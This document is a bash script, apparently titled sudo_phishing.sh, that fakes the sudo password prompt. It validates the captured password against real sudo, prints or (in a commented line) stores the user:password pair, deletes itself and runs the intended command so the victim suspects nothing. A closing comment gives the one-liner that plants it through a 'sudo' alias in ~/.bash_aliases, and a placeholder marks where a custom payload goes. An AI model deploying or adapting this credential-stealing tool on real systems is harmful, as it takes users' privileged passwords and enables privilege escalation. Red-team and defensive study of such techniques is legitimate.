# i="";
# for argument in "$@" 
# do
    
#     i+="${argument} ";
# done
# echo ""
# echo "python /tmp/sudo.py $i"
readonly INPUT_MESSAGE="[sudo] password for ${USER}: "


MAXIMUM_ATTEMPTS=3
readonly ERROR_MESSAGE="sudo: ${MAXIMUM_ATTEMPTS} incorrect password attempts"

attempts() {
    echo "Running fake sudo"
    echo -n "${INPUT_MESSAGE}"
    read -r -s sudo_password
    echo ""
    if ( echo "${sudo_password}" | sudo -k -S true > /dev/null 2>&1 ); then
        MAXIMUM_ATTEMPTS=0
        ##
        # <YOUR-PAYLOAD>
        ##
        /bin/echo "${USER}:${sudo_password}"
        #/bin/echo "${USER}:${sudo_password}" > /tmp/.sudo_password
        ##
        # </YOUR-PAYLOAD>
        ##
        /bin/rm /tmp/sudo_phishing.sh
        # /usr/bin/head -n -1 ~/.bash_aliases > ~/.bash_aliases_bak
        # /bin/mv ~/.bash_aliases_bak ~/.bash_aliases
        /bin/echo "${sudo_password}" | /usr/bin/sudo -S "${@}"
        # $BASH
        exit 0
    else 
        echo "Sorry, try again."
    fi
}


for ((iterator=1; iterator <= MAXIMUM_ATTEMPTS; iterator++)); do
    attempts "${@}"
done
/bin/echo "${ERROR_MESSAGE}"

#rm /tmp/sudo_phishing.sh && cp sudo_phishing.sh /tmp/sudo_phishing.sh && chmod 777 /tmp/sudo_phishing.sh && echo "alias sudo='/tmp/sudo_phishing.sh'" >> ~/.bash_aliases && source ~/.bash_aliases